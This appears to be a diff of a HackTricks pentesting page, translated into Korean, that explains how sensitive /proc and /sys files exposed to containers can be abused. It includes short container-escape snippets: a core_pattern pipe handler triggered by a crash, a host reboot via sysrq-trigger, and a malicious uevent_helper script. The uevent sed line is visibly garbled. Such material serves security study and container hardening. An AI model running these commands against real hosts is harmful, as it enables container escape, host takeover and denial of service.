@@ -2,181 +2,173 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+`/proc` 및 `/sys`의 적절한 네임스페이스 격리 없이 노출되면 공격 표면 확대 및 정보 유출을 포함한 상당한 보안 위험이 발생합니다. 이러한 디렉토리는 민감한 파일을 포함하고 있으며, 잘못 구성되거나 무단 사용자가 접근할 경우 컨테이너 탈출, 호스트 수정 또는 추가 공격에 도움이 되는 정보를 제공할 수 있습니다. 예를 들어, `-v /proc:/host/proc`를 잘못 마운트하면 경로 기반 특성으로 인해 AppArmor 보호를 우회할 수 있으며, `/host/proc`가 보호되지 않게 됩니다.
 
-{% embed url="https://websec.nl/" %}
-
-The exposure of `/proc` and `/sys` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.
-
-**You can find further details of each potential vuln in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
+**각 잠재적 취약점에 대한 추가 세부정보는** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**에서 확인할 수 있습니다.**
 
 ## procfs Vulnerabilities
 
 ### `/proc/sys`
 
-This directory permits access to modify kernel variables, usually via `sysctl(2)`, and contains several subdirectories of concern:
+이 디렉토리는 일반적으로 `sysctl(2)`를 통해 커널 변수를 수정할 수 있는 접근을 허용하며, 여러 개의 우려되는 하위 디렉토리를 포함합니다:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
-- Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.
-- **Testing and Exploitation Example**:
+- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)에서 설명됨.
+- 코어 파일 생성 시 실행할 프로그램을 정의할 수 있으며, 첫 128 바이트가 인수로 사용됩니다. 파일이 파이프 `|`로 시작하면 코드 실행으로 이어질 수 있습니다.
+- **테스트 및 악용 예시**:
 
-  ```bash
-  [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
-  cd /proc/sys/kernel
-  echo "|$overlay/shell.sh" > core_pattern # Set custom handler
-  sleep 5 && ./crash & # Trigger handler
-  ```
+```bash
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 쓰기 접근 테스트
+cd /proc/sys/kernel
+echo "|$overlay/shell.sh" > core_pattern # 사용자 정의 핸들러 설정
+sleep 5 && ./crash & # 핸들러 트리거
+```
 
 #### **`/proc/sys/kernel/modprobe`**
 
-- Detailed in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Contains the path to the kernel module loader, invoked for loading kernel modules.
-- **Checking Access Example**:
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 자세히 설명됨.
+- 커널 모듈 로더의 경로를 포함하며, 커널 모듈을 로드하기 위해 호출됩니다.
+- **접근 확인 예시**:
 
-  ```bash
-  ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
-  ```
+```bash
+ls -l $(cat /proc/sys/kernel/modprobe) # modprobe 접근 확인
+```
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Referenced in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 참조됨.
+- OOM 조건이 발생할 때 커널이 패닉을 일으키거나 OOM 킬러를 호출할지를 제어하는 전역 플래그입니다.
 
 #### **`/proc/sys/fs`**
 
-- As per [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contains options and information about the file system.
-- Write access can enable various denial-of-service attacks against the host.
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 따라 파일 시스템에 대한 옵션 및 정보를 포함합니다.
+- 쓰기 접근은 호스트에 대한 다양한 서비스 거부 공격을 가능하게 할 수 있습니다.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Allows registering interpreters for non-native binary formats based on their magic number.
-- Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.
-- Relevant exploit and explanation:
-  - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-  - In-depth tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- 매직 넘버에 따라 비네이티브 이진 형식에 대한 인터프리터를 등록할 수 있습니다.
+- `/proc/sys/fs/binfmt_misc/register`가 쓰기 가능할 경우 권한 상승 또는 루트 셸 접근으로 이어질 수 있습니다.
+- 관련된 악용 및 설명:
+- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
+- 심층 튜토리얼: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Others in `/proc`
 
 #### **`/proc/config.gz`**
 
-- May reveal the kernel configuration if `CONFIG_IKCONFIG_PROC` is enabled.
-- Useful for attackers to identify vulnerabilities in the running kernel.
+- `CONFIG_IKCONFIG_PROC`가 활성화된 경우 커널 구성을 노출할 수 있습니다.
+- 공격자가 실행 중인 커널의 취약점을 식별하는 데 유용합니다.
 
 #### **`/proc/sysrq-trigger`**
 
-- Allows invoking Sysrq commands, potentially causing immediate system reboots or other critical actions.
-- **Rebooting Host Example**:
+- Sysrq 명령을 호출할 수 있으며, 즉각적인 시스템 재부팅 또는 기타 중요한 작업을 유발할 수 있습니다.
+- **호스트 재부팅 예시**:
 
-  ```bash
-  echo b > /proc/sysrq-trigger # Reboots the host
-  ```
+```bash
+echo b > /proc/sysrq-trigger # 호스트 재부팅
+```
 
 #### **`/proc/kmsg`**
 
-- Exposes kernel ring buffer messages.
-- Can aid in kernel exploits, address leaks, and provide sensitive system information.
+- 커널 링 버퍼 메시지를 노출합니다.
+- 커널 악용, 주소 유출 및 민감한 시스템 정보를 제공하는 데 도움이 될 수 있습니다.
 
 #### **`/proc/kallsyms`**
 
-- Lists kernel exported symbols and their addresses.
-- Essential for kernel exploit development, especially for overcoming KASLR.
-- Address information is restricted with `kptr_restrict` set to `1` or `2`.
-- Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- 커널에서 내보낸 심볼과 그 주소를 나열합니다.
+- KASLR을 극복하기 위한 커널 악용 개발에 필수적입니다.
+- 주소 정보는 `kptr_restrict`가 `1` 또는 `2`로 설정된 경우 제한됩니다.
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 자세한 내용.
 
 #### **`/proc/[pid]/mem`**
 
-- Interfaces with the kernel memory device `/dev/mem`.
-- Historically vulnerable to privilege escalation attacks.
-- More on [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- 커널 메모리 장치 `/dev/mem`와 인터페이스합니다.
+- 역사적으로 권한 상승 공격에 취약했습니다.
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 더 많은 정보.
 
 #### **`/proc/kcore`**
 
-- Represents the system's physical memory in ELF core format.
-- Reading can leak host system and other containers' memory contents.
-- Large file size can lead to reading issues or software crashes.
-- Detailed usage in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
+- 시스템의 물리적 메모리를 ELF 코어 형식으로 나타냅니다.
+- 읽기는 호스트 시스템 및 다른 컨테이너의 메모리 내용을 유출할 수 있습니다.
+- 큰 파일 크기는 읽기 문제 또는 소프트웨어 충돌을 초래할 수 있습니다.
+- [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)에서 자세한 사용법.
 
 #### **`/proc/kmem`**
 
-- Alternate interface for `/dev/kmem`, representing kernel virtual memory.
-- Allows reading and writing, hence direct modification of kernel memory.
+- 커널 가상 메모리를 나타내는 `/dev/kmem`의 대체 인터페이스입니다.
+- 읽기 및 쓰기를 허용하므로 커널 메모리를 직접 수정할 수 있습니다.
 
 #### **`/proc/mem`**
 
-- Alternate interface for `/dev/mem`, representing physical memory.
-- Allows reading and writing, modification of all memory requires resolving virtual to physical addresses.
+- 물리적 메모리를 나타내는 `/dev/mem`의 대체 인터페이스입니다.
+- 읽기 및 쓰기를 허용하며, 모든 메모리 수정을 위해 가상 주소를 물리적 주소로 변환해야 합니다.
 
 #### **`/proc/sched_debug`**
 
-- Returns process scheduling information, bypassing PID namespace protections.
-- Exposes process names, IDs, and cgroup identifiers.
+- PID 네임스페이스 보호를 우회하여 프로세스 스케줄링 정보를 반환합니다.
+- 프로세스 이름, ID 및 cgroup 식별자를 노출합니다.
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Provides information about mount points in the process's mount namespace.
-- Exposes the location of the container `rootfs` or image.
+- 프로세스의 마운트 네임스페이스에서 마운트 지점에 대한 정보를 제공합니다.
+- 컨테이너 `rootfs` 또는 이미지의 위치를 노출합니다.
 
 ### `/sys` Vulnerabilities
 
 #### **`/sys/kernel/uevent_helper`**
 
-- Used for handling kernel device `uevents`.
-- Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
-- **Example for Exploitation**: %%%bash
+- 커널 장치 `uevents`를 처리하는 데 사용됩니다.
+- `/sys/kernel/uevent_helper`에 쓰면 `uevent` 트리거 시 임의의 스크립트를 실행할 수 있습니다.
+- **악용 예시**: %%%bash
 
-  #### Creates a payload
+#### 페이로드 생성
 
-  echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
+echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-  #### Finds host path from OverlayFS mount for container
+#### OverlayFS 마운트에서 호스트 경로 찾기
 
-  host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
+host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-  #### Sets uevent_helper to malicious helper
+#### 악성 헬퍼로 uevent_helper 설정
 
-  echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
+echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
-  #### Triggers a uevent
+#### uevent 트리거
 
-  echo change > /sys/class/mem/null/uevent
+echo change > /sys/class/mem/null/uevent
 
-  #### Reads the output
+#### 출력 읽기
 
-  cat /output %%%
+cat /output %%%
 
 #### **`/sys/class/thermal`**
 
-- Controls temperature settings, potentially causing DoS attacks or physical damage.
+- 온도 설정을 제어하며, 서비스 거부 공격이나 물리적 손상을 초래할 수 있습니다.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Leaks kernel addresses, potentially compromising KASLR.
+- 커널 주소를 유출하여 KASLR을 손상시킬 수 있습니다.
 
 #### **`/sys/kernel/security`**
 
-- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
-- Access might enable a container to disable its MAC system.
+- Linux 보안 모듈(AppArmor 등)의 구성을 허용하는 `securityfs` 인터페이스를 포함합니다.
+- 접근이 가능하면 컨테이너가 자신의 MAC 시스템을 비활성화할 수 있습니다.
 
-#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
+#### **`/sys/firmware/efi/vars` 및 `/sys/firmware/efi/efivars`**
 
-- Exposes interfaces for interacting with EFI variables in NVRAM.
-- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
+- NVRAM에서 EFI 변수와 상호작용하기 위한 인터페이스를 노출합니다.
+- 잘못된 구성이나 악용은 브릭된 노트북이나 부팅 불가능한 호스트 머신으로 이어질 수 있습니다.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` offers a "no rules" debugging interface to the kernel.
-- History of security issues due to its unrestricted nature.
+- `debugfs`는 커널에 대한 "규칙 없음" 디버깅 인터페이스를 제공합니다.
+- 제한 없는 특성으로 인해 보안 문제의 이력이 있습니다.
 
 ### References
 
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
 - [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
-
-<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../../../banners/hacktricks-training.md}}
